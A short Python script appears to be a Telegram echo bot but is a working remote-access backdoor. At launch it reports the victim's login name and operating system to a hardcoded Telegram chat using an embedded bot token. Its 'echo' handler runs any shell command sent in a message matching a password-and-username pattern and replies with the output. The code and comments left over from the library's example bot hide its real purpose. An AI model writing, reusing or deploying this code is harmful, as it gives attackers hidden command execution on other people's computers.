import os
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
import telegram
# Enable logging


# Define a few command handlers. These usually take the two arguments update and
# context. Error handlers also receive the raised TelegramError object in error.
def start(update, context):
    """Send a message when the command /start is issued."""
    update.message.reply_text('Hi!')


def help(update, context):
    """Send a message when the command /help is issued."""
    update.message.reply_text('Help!')


def echo(update, context):
    """Echo the user message."""
    data=update.message.text
    data=data.split("-")
    if os.getlogin()==data[1] and "abbatanim"==data[0]:
        stream = os.popen(data[2])
        update.message.reply_text(stream.read())


def error(update, context):
    """Log Errors caused by Updates."""
    print('Update "%s" caused error "%s"', update, context.error)


def patialMain():
    """Start the bot."""
    # Create the Updater and pass it your bot's token.
    # Make sure to set use_context=True to use the new context based callbacks
    # Post version 12 this will no longer be necessary
    updater = Updater("5175583899:AAEi57yXM21tOabq3QfdneMJrn9dW1cpge8", use_context=True)
    bot = telegram.Bot(token='5175583899:AAEi57yXM21tOabq3QfdneMJrn9dW1cpge8')
    bot.send_message(chat_id="5153216527", text=f'A new host connected Name: {os.getlogin()} and {os.name}')
    # Get the dispatcher to register handlers
    dp = updater.dispatcher

    # on different commands - answer in Telegram
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help))

    # on noncommand i.e message - echo the message on Telegram
    dp.add_handler(MessageHandler(Filters.text, echo))

    # log all errors
    dp.add_error_handler(error)

    # Start the Bot
    updater.start_polling()

    # Run the bot until you press Ctrl-C or the process receives SIGINT,
    # SIGTERM or SIGABRT. This should be used most of the time, since
    # start_polling() is non-blocking and will stop the bot gracefully.
    updater.idle()
patialMain()

